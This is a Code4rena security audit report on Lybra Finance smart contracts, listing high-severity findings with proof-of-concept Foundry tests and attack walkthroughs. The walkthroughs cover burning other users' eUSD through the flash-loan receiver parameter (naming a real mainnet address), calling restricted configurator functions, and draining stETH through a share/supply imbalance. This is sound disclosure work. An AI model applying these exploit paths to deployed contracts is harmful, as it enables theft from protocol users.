---
sponsor: "Lybra Finance"
slug: "2023-06-lybra"
date: "2023-08-21"
title: "Lybra Finance"
findings: "https://github.com/code-423n4/2023-06-lybra-findings/issues"
contest: 254
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Lybra Finance smart contract system written in Solidity. The audit took place between June 23 - July 3 2023.

## Wardens

136 Wardens contributed reports to the Lybra Finance:

  1. 0x3b
  2. [0xAnah](https://twitter.com/0xAnah)
  3. 0xMAKEOUTHILL
  4. 0xNightRaven
  5. 0xRobocop
  6. 0xbrett8571
  7. 0xcm
  8. [0xgrbr](https://twitter.com/x0grbr)
  9. 0xhacksmithh
  10. 0xkazim
  11. [0xnacho](https://twitter.com/0xnacho17)
  12. [0xnev](https://twitter.com/0xnevi)
  13. [3agle](https://twitter.com/0x34gle)
  14. [8olidity](https://twitter.com/8olidity)
  15. [ABAIKUNANBAEV](https://twitter.com/_onlyowner)
  16. [Arz](https://twitter.com/arzdev)
  17. [Bauchibred](https://twitter.com/bauchibred?s&#x3D;21&amp;t&#x3D;7sv-1qcnwtkdTA81Iog0yQ )
  18. Breeje
  19. Brenzee
  20. [BugBusters](https://twitter.com/0xnirlin) ([nirlin](https://twitter.com/0xnirlin) and [0xepley](https://twitter.com/0xepley))
  21. Bughunter101
  22. [Co0nan](https://twitter.com/Conan0x3)
  23. [CrypticShepherd](https://twitter.com/CrypticShepherd)
  24. [Cryptor](https://twitter.com/DeFiCast)
  25. D\_Auditor
  26. DavidGiladi
  27. [DedOhWale](https://twitter.com/dedohwale)
  28. [DelerRH](https://twitter.com/deler_rh)
  29. HE1M
  30. Hama
  31. IceBear
  32. Inspecktor
  33. Iurii3
  34. [JCN](https://twitter.com/0xJCN)
  35. [Jorgect](https://twitter.com/TamayoNft)
  36. [K42](https://twitter.com/CrystAlline_K42)
  37. [Kaysoft](https://www.linkedin.com/in/kayode-okunlade-862001142/)
  38. [Kenshin](https://twitter.com/nonfungiblenero)
  39. [KupiaSec](KupiaSecurity)
  40. LaScaloneta ([nicobevi](https://github.com/nicobevilacqua), [juancito](https://twitter.com/0xJuancito) and 0x4non)
  41. [LokiThe5th](https://twitter.com/LourensLinde)
  42. [LuchoLeonel1](https://twitter.com/lucho_leonel1)
  43. MohammedRizwan
  44. MrPotatoMagic
  45. Musaka (0x3b and [ZdravkoHr](https://www.linkedin.com/in/zdravko-hristov-716920205/))
  46. Neon2835
  47. No12Samurai
  48. OMEN
  49. [Qeew](https://twitter.com/adigunq_adigun)
  50. Rageur
  51. Raihan
  52. RedOneN
  53. RedTiger
  54. ReyAdmirado
  55. [Rolezn](https://twitter.com/Rolezn)
  56. SAAJ
  57. SAQ
  58. SM3\_SS
  59. SanketKogekar
  60. [Sathish9098](https://www.linkedin.com/in/sathishkumar-p-26069915a)
  61. [Silvermist](https://twitter.com/MarinaPironeva)
  62. SovaSlava
  63. SpicyMeatball
  64. T1MOH
  65. [Timenov](https://www.instagram.com/pt__42/)
  66. TorpedoPistolIXC41
  67. [Toshii](https://twitter.com/0xToshii)
  68. [Vagner](https://twitter.com/VagnerAndrei98)
  69. a3yip6
  70. adeolu
  71. [alexweb3](https://twitter.com/alexweb310)
  72. ayden
  73. [ayo\_dev](https://twitter.com/MalikAremu1)
  74. [azhar](https://twitter.com/azhar0406)
  75. bart1e
  76. btk
  77. [bytes032](https://twitter.com/bytes032)
  78. [cartlex\_](https://twitter.com/cartlex)
  79. caventa
  80. cccz
  81. codetilda
  82. cthulhu_cult ([badbird](https://twitter.com/b4db1rd) and [seanamani](https://twitter.com/SeanEmile))
  83. [dacian](https://twitter.com/DevDacian)
  84. devival
  85. [dharma09](https://twitter.com/im_Dharma09)
  86. f00l
  87. [fatherOfBlocks](https://twitter.com/father0fBl0cks)
  88. [georgypetrov](https://twitter.com/georgypetrov_)
  89. gs8nrv
  90. halden
  91. hals
  92. hl\_
  93. [hunter\_w3b](https://twitter.com/hunt3r_w3b)
  94. [jnrlouis](https://twitter.com/Lo0_0u)
  95. [josephdara](twitter.com/josephdara)
  96. kankodu
  97. ke1caM
  98. kenta
  99. koo
  100. ktg
  101. kutugu
  102. [lanrebayode77](https://twitter.com/LanreBayode1)
  103. [m\_Rassska](https://t.me/Road220)
  104. mahdikarimi
  105. mahyar
  106. max10afternoon
  107. mgf15
  108. mladenov
  109. mrudenko
  110. [n1punp](https://twitter.com/n1punp)
  111. [naman1778](https://www.linkedin.com/in/naman-agrawal1778/)
  112. [nonseodion](https://twitter.com/nonseodion)
  113. peanuts
  114. pep7siup
  115. qpzm
  116. sces60107
  117. [seth\_lawson](https://twitter.com/LateSeth)
  118. shamsulhaq123
  119. skyge
  120. smaul
  121. solsaver
  122. souilos
  123. [squeaky\_cactus](https://twitter.com/squeaky_cactus)
  124. [totomanov](https://twitter.com/totomanov)
  125. [turvy\_fuzz](https://www.linkedin.com/in/victor-okafor-blockchaindev/)
  126. [y51r](https://twitter.com/irys_gbess)
  127. yjrwkk
  128. yudan
  129. [zaevlad](https://zaevlad.com/)
  130. zaggle
  131. [zambody](https://twitter.com/zdotftm)

This audit was judged by [0xean](https://github.com/0xean).

Final report assembled by thebrittfactor.

# Summary

The C4 analysis yielded an aggregated total of 31 unique vulnerabilities. Of these vulnerabilities, 8 received a risk rating in the category of HIGH severity and 23 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 42 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 22 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Lybra Finance repository](https://github.com/code-423n4/2023-06-lybra), and is composed of 21 smart contracts written in the Solidity programming language and includes 1762 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (8)
## [[H-01] There is a vulnerability in the `executeFlashloan` function of the `PeUSDMainnet` contract. Hackers can use this vulnerability to burn other people's eUSD token balance without permission](https://github.com/code-423n4/2023-06-lybra-findings/issues/769)
*Submitted by [Neon2835](https://github.com/code-423n4/2023-06-lybra-findings/issues/769), also found by [MohammedRizwan](https://github.com/code-423n4/2023-06-lybra-findings/issues/970), [Arz](https://github.com/code-423n4/2023-06-lybra-findings/issues/870), [DedOhWale](https://github.com/code-423n4/2023-06-lybra-findings/issues/863), [0xcm](https://github.com/code-423n4/2023-06-lybra-findings/issues/631), [0xRobocop](https://github.com/code-423n4/2023-06-lybra-findings/issues/544), [azhar](https://github.com/code-423n4/2023-06-lybra-findings/issues/533), [HE1M](https://github.com/code-423n4/2023-06-lybra-findings/issues/503), [zaevlad](https://github.com/code-423n4/2023-06-lybra-findings/issues/280), and [kankodu](https://github.com/code-423n4/2023-06-lybra-findings/issues/215)*

### Lines of code

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/PeUSDMainnetStableVision.sol#L129-L139>

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/EUSD.sol#L228-L230>

### Impact

The `executeFlashloan` function of the `PeUSDMainnet` contract is used to provide users with the flash loan function. There is a loophole in the logic and hackers can use this loophole to burn other people's eUSD token balance without permission.

### Proof of Concept

Since the parameter `FlashBorrower receiver` of the `executeFlashloan` function can be designated as anyone, the flash loan system will charge a certain percentage of the loan fee (up to 10%) to `receiver` for each flash loan. The code is as follows:

    EUSD.burnShares(address(receiver), burnShare);

When a hacker maliciously initiates a flash loan for a `receiver` contract, and the value of the `eusdAmount` parameter passed in is large enough, the `receiver` will be deducted a large amount of loan fees; the hacker can burn a large amount of other people's eUSD without permissioning the amount.

Let us analyze the design logic of the system itself step by step for discussion:

1.  The flashloan fee of the `PeUSDMainnet` contract is collected by calling the `burnShares` function of the `EUSD` contract. Continue to read the code to find that the `burnShares` function of the `EUSD` contract has a very critical `modifier onlyMintVault` condition Judgment, so it is obvious that the `PeUSDMainnet` contract is the minter role of the `EUSD` contract (otherwise it will not be able to charge the flashloan fee).

2.  Usually, when the `transferFrom` function is called, the ERC20 token needs to be approved by the spender before it can be used. But the `transferFrom` function in the `EUSD` contract is implemented like this:

<!---->

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
         address spender = _msgSender();
         if (!configurator. mintVault(spender)) {
             _spendAllowance(from, spender, amount);
         }
         _transfer(from, to, amount);
         return true;
    }

The above code indicates that the miner of EUSD can call `transferFrom` arbitrarily, without the user calling `increaseAllowance` for approval. The `PeUSDMainnet` contract is the minter of the `EUSD` contract, so line 133 of the `PeUSDMainnet` contract code:
`bool success = EUSD.transferFrom(address(receiver), address(this), EUSD.getMintedEUSDByShares(shareAmount));` can be executed without user approval.

3.  In line 132 of the `executeFlashloan` function of the `PeUSDMainnet` contract: `receiver.onFlashLoan(shareAmount, data);`, if the `receiver` does not implement the `onFlashLoan` method, the EVM will revert and the hacker will not be able to maliciously execute the attack. However, if the receiver contract simply declares the `fallback()` function, or its `fallback()` logic does not have a very robust judgment, then line 132 of the code can be easily bypassed. So is there really such a contract that just satisfies this condition? The answer is yes, for example this address: `0x32034276343de43844993979e5384d4b7e030934` (etherscan: <https://etherscan.io/address/0x32034276343de43844993979e5384d4b7e030934#code>), has 200,000 eUSD tokens and declared the `fallback` function, its source code excerpts are as follows:

```solidity
contract GnosisSafeProxy {
    // singleton always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated.
    // To reduce deployment costs this variable is internal and needs to be retrieved via `getStorageAt`
    address internal singleton;

    /// @dev Constructor function sets address of singleton contract.
    /// @param _singleton Singleton address.
    constructor(address _singleton) {
        require(_singleton != address(0), "Invalid singleton address provided");
        singleton = _singleton;
    }

    /// @dev Fallback function forwards all transactions and returns all received return data.
    fallback() external payable {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
                mstore(0, _singleton)
                return(0, 0x20)
            }
            calldatacopy(0, 0, calldatasize())
            let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if eq(success, 0) {
                revert(0, returndatasize())
            }
            return(0, returndatasize())
        }
    }
}
```

4.  Assuming that the `PeUSDMainnet` contract flash loan fee rate is 5% at this time, the hacker maliciously calls the `executeFlashloan` function to initiate a flash loan with the address: `0x32034276343de43844993979e5384d4b7e030934`, the function parameter `uint256 eusdAmount = 4_000_000`, and the calculated loan fee  is`  4_000_000 * 5% = 200_000 `, the 200\_000 eUSD balance of the address `0x32034276343de43844993979e5384d4b7e030934` will be maliciously burned by hackers!

The following is the forge test situation I simulated locally:

    [PASS] testGnosisSafeProxy() (gas: 10044)
    Traces:
      [10044] AttackTest::testGnosisSafeProxy() 
        â”œâ”€ [4844] GnosisSafeProxy::onFlashLoan() 
        â”‚   â”œâ”€ [0] 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552::onFlashLoan() [delegatecall]
        â”‚   â”‚   â””â”€ â† ()
        â”‚   â””â”€ â† ()
        â””â”€ â† ()

    Test result: ok. 1 passed; 0 failed; finished in 972.63Âµs

The `fallback` function of the `GnosisSafeProxy` contract is allowed to be called without revert.

### Tools Used

Visual Studio Code
Foundry

### Recommended Mitigation Steps

Optimize the flash loan logic of the `executeFlashloan` function of the `PeUSDMainnet` contract, remove the `FlashBorrower receiver` parameter, and set `receiver` to `msg.sender`; which means that a user can only initiate a flash loan for themselves.

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/769#issuecomment-1656674715)**

***

## [[H-02] doesn't calculate the current borrowing amount for the provider, including the provider's borrowed shares and accumulated fees due to inconsistency in `collateralRatio` calculation](https://github.com/code-423n4/2023-06-lybra-findings/issues/723)
*Submitted by [turvy\_fuzz](https://github.com/code-423n4/2023-06-lybra-findings/issues/723), also found by [SpicyMeatball](https://github.com/code-423n4/2023-06-lybra-findings/issues/301)*

### Lines of code

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L127>

### Proof of Concept

Borrowers `collateralRatio` in the `liquidation()` function is calculated by:

```solidity
uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / getBorrowedOf(onBehalfOf);
```

Notice it calls the `getBorrowedOf()` function, which
calculates the current borrowing amount for the borrower, including the borrowed shares and accumulated fees, not just the borrowed amount.

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L253>

```solidity
function getBorrowedOf(address user) public view returns (uint256) {
        return borrowed[user] + feeStored[user] + _newFee(user);
    }
```

However, the providers `collateralRatio` in the `rigidRedemption()` function is calculated by:

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L161>

```solidity
uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider];
```

Here, the deposit asset is divided by only the borrowed amount, missing out on the borrowed shares and accumulated fees.

### Tools Used

Visual Studio Code

### Recommended Mitigation Steps

Be consistent with `collateralRatio` calculation.

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/723#issuecomment-1635550670)**

***

## [[H-03] Incorrectly implemented modifiers in `LybraConfigurator.sol` allow any address to call functions that are supposed to be restricted](https://github.com/code-423n4/2023-06-lybra-findings/issues/704)
*Submitted by [alexweb3](https://github.com/code-423n4/2023-06-lybra-findings/issues/704), also found by [D\_Auditor](https://github.com/code-423n4/2023-06-lybra-findings/issues/963), [josephdara](https://github.com/code-423n4/2023-06-lybra-findings/issues/891), [TorpedoPistolIXC41](https://github.com/code-423n4/2023-06-lybra-findings/issues/770), [zaggle](https://github.com/code-423n4/2023-06-lybra-findings/issues/724), [koo](https://github.com/code-423n4/2023-06-lybra-findings/issues/657), [cartlex\_](https://github.com/code-423n4/2023-06-lybra-findings/issues/645), [hals](https://github.com/code-423n4/2023-06-lybra-findings/issues/584), [mladenov](https://github.com/code-423n4/2023-06-lybra-findings/issues/516), [Neon2835](https://github.com/code-423n4/2023-06-lybra-findings/issues/510), [Neon2835](https://github.com/code-423n4/2023-06-lybra-findings/issues/506), [lanrebayode77](https://github.com/code-423n4/2023-06-lybra-findings/issues/481), [Silvermist](https://github.com/code-423n4/2023-06-lybra-findings/issues/417), [pep7siup](https://github.com/code-423n4/2023-06-lybra-findings/issues/372), [Musaka](https://github.com/code-423n4/2023-06-lybra-findings/issues/343), [Timenov](https://github.com/code-423n4/2023-06-lybra-findings/issues/251), [Timenov](https://github.com/code-423n4/2023-06-lybra-findings/issues/249), [LuchoLeonel1](https://github.com/code-423n4/2023-06-lybra-findings/issues/205), [mahyar](https://github.com/code-423n4/2023-06-lybra-findings/issues/142), [mrudenko](https://github.com/code-423n4/2023-06-lybra-findings/issues/116), [DedOhWale](https://github.com/code-423n4/2023-06-lybra-findings/issues/70), [adeolu](https://github.com/code-423n4/2023-06-lybra-findings/issues/51), [zaevlad](https://github.com/code-423n4/2023-06-lybra-findings/issues/9), and [DelerRH](https://github.com/code-423n4/2023-06-lybra-findings/issues/8)*

The modifiers `onlyRole` (bytes32 role) and `checkRole` (bytes32 role) are not implemented correctly. This would allow anybody to call sensitive functions that should be restricted.

### Proof of Concept

For the POC, I set up a new foundry projects and copied the folders lybra, mocks and OFT in the src folder of the new project. I installed the dependencies and then I created a file `POCs.t.sol` in the test folder. Here is the code that shows a random address can call sensitive functions that should be restricted:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/lybra/configuration/LybraConfigurator.sol";
import "../src/lybra/governance/GovernanceTimelock.sol";
import "../src/lybra/miner/esLBRBoost.sol";

contract POCsTest is Test {
    Configurator public lybraConfigurator;
    GovernanceTimelock public governance;
    esLBRBoost public boost;

    address public dao = makeAddr("dao");
    address public curvePool = makeAddr("curvePool");
    address public randomUser = makeAddr("randomUser");
    address public admin = makeAddr("admin");

    address public eusd = makeAddr("eusd");
    address public pEusd = makeAddr("pEusd");

    address proposerOne = makeAddr("proposerOne");
    address executorOne = makeAddr("executorOne");

    address[] proposers = [proposerOne];
    address[] executors = [executorOne];

    address public rewardsPool = makeAddr("rewardsPool");

    function setUp() public {
        governance = new GovernanceTimelock(10000, proposers, executors, admin);
        lybraConfigurator = new Configurator(address(governance), curvePool);
        boost = new esLBRBoost();
    }

    function testIncorrectlyImplementedModifiers() public {
        console.log("EUSD BEFORE", address(lybraConfigurator.EUSD()));
        vm.prank(randomUser);
        lybraConfigurator.initToken(eusd, pEusd);
        console.log("EUSD AFTER", address(lybraConfigurator.EUSD()));

        console.log("RewardsPool BEFORE", address(lybraConfigurator.lybraProtocolRewardsPool()));
        vm.prank(randomUser);
        lybraConfigurator.setProtocolRewardsPool(rewardsPool);
        console.log("RewardsPool AFTER", address(lybraConfigurator.lybraProtocolRewardsPool()));
    }
}
```

### Tools Used

Manual Review

### Recommended Mitigation Steps

Wrap the 2 function calls in a require statement:

In modifier `onlyRole` (bytes32 role), instead of `GovernanceTimelock.checkOnlyRole` (role, msg.sender), it should be something like require (`GovernanceTimelock.checkOnlyRole` (role, msg.sender), "Not Authorized").

The same goes for the `checkRole` (bytes32 role) modifier.

### Assessed type

Access Control

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/704#issuecomment-1635551912)**

***

## [[H-04] The Constructor Caveat leads to bricking of Configurator contract.](https://github.com/code-423n4/2023-06-lybra-findings/issues/673)
*Submitted by [cthulhu\_cult](https://github.com/code-423n4/2023-06-lybra-findings/issues/673)*

In Solidity, code that is inside a constructor or part of a global variable declaration is not part of a deployed contract's runtime bytecode. This code is executed only once, when the contract instance is deployed. As a consequence of this, the code within a logic contract's constructor will never be executed in the context of the proxy's state. This means that any state changes made in the constructor of a logic contract will not be reflected in the proxy's state.
1.  This will lead to governance timelocks contract and the `curvePool` contract contain default values of zero values.
2.  As a result, all the functions that rely on governance will be broken, since the governance address is set to zero address.

### Proof of Concept

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ITransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {LybraProxy} from "@lybra/Proxy/LybraProxy.sol";
import {LybraProxyAdmin} from "@lybra/Proxy/LybraProxyAdmin.sol";
import {GovernanceTimelock} from "@lybra/governance/GovernanceTimelock.sol";
import {PeUSDMainnet} from "@lybra/token/PeUSDMainnetStableVision.sol";
import {Configurator} from "@lybra/configuration/LybraConfigurator.sol";
import {EUSDMock} from "@mocks/mockEUSD.sol";
import {mockCurve} from "@mocks/mockCurve.sol";
import {mockUSDC} from "@mocks/mockUSDC.sol";

/* remappings used
@lybra=contracts/lybra/
@mocks=contracts/mocks/
 */
contract CounterScript is Test {
    address goerliEndPoint = 0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23;

    LybraProxy proxy;
    LybraProxyAdmin admin;
    GovernanceTimelock govTimeLock;
    mockUSDC usdc;
    mockCurve curve;
    Configurator configurator;
    Configurator configuratorLogic;
     EUSDMock eusd;
    PeUSDMainnet peUsdMainnet;
    address owner = address(7);
    address[] govTimelockArr;

     function setUp() public {
         vm.startPrank(owner);
         govTimelockArr.push(owner);
         govTimeLock = new GovernanceTimelock(
             1,
             govTimelockArr,
             govTimelockArr,
             owner
         );

         usdc = new mockUSDC();
         curve = new mockCurve();
         eusd = new EUSDMock(address(configurator));
         //  _dao , _curvePool
         configuratorLogic = new Configurator(address(govTimeLock), address(curve));

         admin = new LybraProxyAdmin();
         proxy = new LybraProxy(address(configuratorLogic),address(admin),bytes(""));
         configurator = Configurator(address(proxy));

        peUsdMainnet = new PeUSDMainnet(
             address(configurator),
             8,
             goerliEndPoint
         );
         vm.stopPrank();
    }

    function test_LybraConfigurationContractDoesNotInitialize() public {
        vm.startPrank(address(owner));
        vm.expectRevert(); // Since the Governance time lock is set to zero. 
        configurator.initToken(address(eusd), address(peUsdMainnet));
    }
}
```

### Tools Used

1.  Manual Code review
2.  Foundry for POC

### Recommended Mitigation Steps

[LybraConfiguration.sol#L81](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/configuration/LybraConfigurator.sol#L81) contracts should move the code within the constructor to a regular "initializer" function, and have this function be called whenever the proxy links to this logic contract. Special care needs to be taken with this initializing function so that it can only be called once and use another initialization mechanism, since the governance address should be set in the initialize.

### Assessed type

Upgradable

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/673#issuecomment-1635556436)**

**[0xean (judge) commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/673#issuecomment-1655885310):**
 > On the fence re: severity here and could see the argument for this being M.  Will leave as submitted for now, but open to comment during QA on the topic. 

***

## [[H-05] Making `_totalSupply` and `_totalShares` imbalance significantly by providing fake income leads to stealing fund](https://github.com/code-423n4/2023-06-lybra-findings/issues/340)
*Submitted by [HE1M](https://github.com/code-423n4/2023-06-lybra-findings/issues/340)*

If the project has just started, a malicious user can make the `_totalSupply` and `_totalShares` imbalance significantly by providing fake income. By doing so, later, when innocent users deposit and mint, the malicious user can steal protocol's stETH without burning any shares. Moreover, the protocol's income can be stolen as well.

### Proof of Concept

Suppose nothing is deposited in the protocol (it is day 0).

Bob (a malicious user) deposits `$`1000 worth of ether (equal to 1 ETH, assuming ETH price is `$`1000) to mint `200e18 + 1` eUSD. The state will be:
*   `shares[Bob] = 200e18 + 1`
*   `_totalShares = 200e18 + 1`
*   `_totalSupply = 200e18 + 1`
*   `borrowed[Bob] = 200e18 + 1`
*   `poolTotalEUSDCirculation = 200e18 + 1`
*   `depositAsset[Bob] = 1e18`
*   `totalDepositedAsset = 1e18`
*   `stETH.balanceOf(protocol) = 1e18`

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L37>

Then, Bob transfers directly `0.2stETH` (worth `$`200) to the protocol. By doing so, Bob is providing a fake excess income in the protocol. So, the state will be:
*   `shares[Bob] = 200e18 + 1`
*   `_totalShares = 200e18 + 1`
*   `_totalSupply = 200e18 + 1`
*   `borrowed[Bob] = 200e18 + 1`
*   `poolTotalEUSDCirculation = 200e18 + 1`
*   `depositAsset[Bob] = 1e18`
*   `totalDepositedAsset = 1e18`
*   `stETH.balanceOf(protocol) = 1e18 + 2e17`

Then, Bob calls `excessIncomeDistribution` to buy this excess income. As you see in line 63, the `excessIncome` is equal to the difference of `stETH.balanceOf(protocol)` and `totalDepositedAsset`. So, the `excessAmount = 2e17`.

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L63>

Then, in line 66, this amount `2e17` is converted to eUSD amount based on the price of stETH. Since, we assumed  ETH is `$`1000, we have:

    uint256 payAmount = (((realAmount * getAssetPrice()) / 1e18) * getDutchAuctionDiscountPrice()) / 10000 = 2e17 * 1000e18 / 1e18 = 200e18

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L66C9-L66C112>

Since the protocol has just started, there is no `feeStored`, so the income is equal to zero. 

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L68>

In line 75, we have:

    uint256 sharesAmount = _EUSDAmount.mul(_totalShares).div(totalMintedEUSD) = 200e18 * (200e18 + 1) / (200e18 + 1) = 200e18

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L75C13-L75C35>

In line 81, this amount of `sharesAmount` will be burned from Bob, and then in line 93, `2e17` stETH will be transferred to Bob. So, the state will be:

*   `shares[Bob] = 200e18 + 1 - 200e18 = 1`
*   `_totalShares = 200e18 + 1 - 200e18 = 1`
*   `_totalSupply = 200e18 + 1`
*   `borrowed[Bob] = 200e18 + 1`
*   `poolTotalEUSDCirculation = 200e18 + 1`
*   `depositAsset[Bob] = 1e18`
*   `totalDepositedAsset = 1e18`
*   `stETH.balanceOf(protocol) = 1e18 + 2e17 - 2e17 = 1e18`

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L81>

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L93>

**Please note** that currently we have `_totalSupply = 200e18 + 1` and `_totalShares = 1`.

Suppose, Alice (an innocent user) deposits 10ETH, and mints 4000e18 eUSD. So, the amount of shares minted to Alice will be:

    sharesAmount = _EUSDAmount.mul(_totalShares).div(totalMintedEUSD) = 4000e18 * 1 / (200e18 + 1) = 19

So, the state will be:
*   `shares[Bob] = 1`
*   `_totalShares = 1 + 19 = 20`
*   `_totalSupply = 200e18 + 1 + 4000e18 = 4200e18 + 1`
*   `borrowed[Bob] = 200e18 + 1`
*   `poolTotalEUSDCirculation = 200e18 + 1 + 4000e18 = 4200e18 + 1`
*   `depositAsset[Bob] = 1e18`
*   `totalDepositedAsset = 1e18 + 10e18 = 11e18`
*   `stETH.balanceOf(protocol) = 1e18 + 10e18 = 11e18`
*   `shares[Alice] = 19`
*   `borrowed[Alice] = 4000e18`
*   `depositAsset[Alice] = 10e18`

Now, different issues can happen leading to loss/steal of funds:
<details>

* **First Scenario:** If Alice is a provider, Bob can redeem eUSD multiple of times to receive stETH without burning any share by calling `rigidRedemption`. To be more accurate, Bob should call this function with `eusdAmount` as parameter equal to `_totalSupply / _totalShares`. For example:

    *   First call: `rigidRedemption (Alice, 210e18)`, so we will have:
        *   `shares[Bob] = 1`
        *   `_totalShares  = 20`
        *   `_totalSupply = 4200e18 + 1 - 210e18 = 3990e18 + 1`
        *   `borrowed[Bob] = 200e18 + 1`
        *   `poolTotalEUSDCirculation = 4200e18 + 1 - 210e18 = 3990e18 + 1`
        *   `depositAsset[Bob] = 1e18`
        *   `totalDepositedAsset = 11e18 - 21e16`
        *   `stETH.balanceOf(protocol) = 11e18 - 21e16`
        *   `shares[Alice] = 19`
        *   `borrowed[Alice] = 4000e18 - 210e18 = 3790e18`
        *   `depositAsset[Alice] = 10e18 - 21e16`<br>
        Please note that no shares are burned from Bob, because `getSharesByMintedEUSD` returns zero as `210e18 * 20 / (4200e18 + 1) = 0`. It means, Bob receives 0.21 stETH by burning no shares.

    *   Second call: `rigidRedemption (Alice, 199e18)`, so we will have:
        *   `shares[Bob] = 1`
        *   `_totalShares  = 20`
        *   `_totalSupply = 3990e18 + 1 - 199e18 = 3791e18 + 1`
        *   `borrowed[Bob] = 200e18 + 1`
        *   `poolTotalEUSDCirculation = 3990e18 + 1 - 199e18 = 3791e18 + 1`
        *   `depositAsset[Bob] = 1e18`
        *   `totalDepositedAsset = 11e18 - 210e15 - 199e15 = 11e18 - 409e15`
        *   `stETH.balanceOf(protocol) = 11e18 - 210e15 - 199e15 = 11e18 - 409e15`
        *   `shares[Alice] = 19`
        *   `borrowed[Alice] = 3790e18 - 199e18 = 3591e18`
        *   `depositAsset[Alice] = 10e18 - 210e15 - 199e15 = 10e18 - 409e15`<br>
        Please note that no shares are burned from Bob, because `getSharesByMintedEUSD` returns zero as `199e18 * 20 / (3990e18 + 1) = 0`. It means, Bob receives 0.199 stETH by burning no shares.

    *   Third call: `rigidRedemption (Alice, 189e18)`, so we will have:
        *   `shares[Bob] = 1`
        *   `_totalShares  = 20`
        *   `_totalSupply = 3791e18 + 1 - 189e18 = 3602e18 + 1`
        *   `borrowed[Bob] = 200e18 + 1`
        *   `poolTotalEUSDCirculation = 3791e18 + 1 - 189e18 = 3602e18 + 1`
        *   `depositAsset[Bob] = 1e18`
        *   `totalDepositedAsset = 11e18 - 409e15 - 189e15 = 11e18 - 598e15`
        *   `stETH.balanceOf(protocol) = 11e18 - 409e15 - 189e15 = 11e18 - 598e15`
        *   `shares[Alice] = 19`
        *   `borrowed[Alice] = 3591e18 - 189e18 = 3402e18`
        *   `depositAsset[Alice] = 10e18 - 409e15 - 189e15 = 10e18 - 598e15`<br>
        Please note that no shares are burned from Bob, because `getSharesByMintedEUSD` returns zero as `189e18 * 20 / (3791e18 + 1) = 0`. It means, Bob receives 0.189 stETH by burning no shares.<br>

  So far, by just calling the function `rigidRedemption` three times, Bob received `0.21 + 0.199 + 0.189 = 0.598` stETH (worths `$`598). If Bob continues calling this function, their gain will increase more and more to the point that `_totalSupply` and `_totalShares` become closer to each other.

  A simple calculation shows that if Bob calls this function 60 times (for sure each time the input parameter should be adjusted based on the `_totalSupply` and `_totalShares`), the state will be:

  * `shares[Bob] = 1`
  * `_totalShares  = 20`
  * `_totalSupply = 203.7e18`
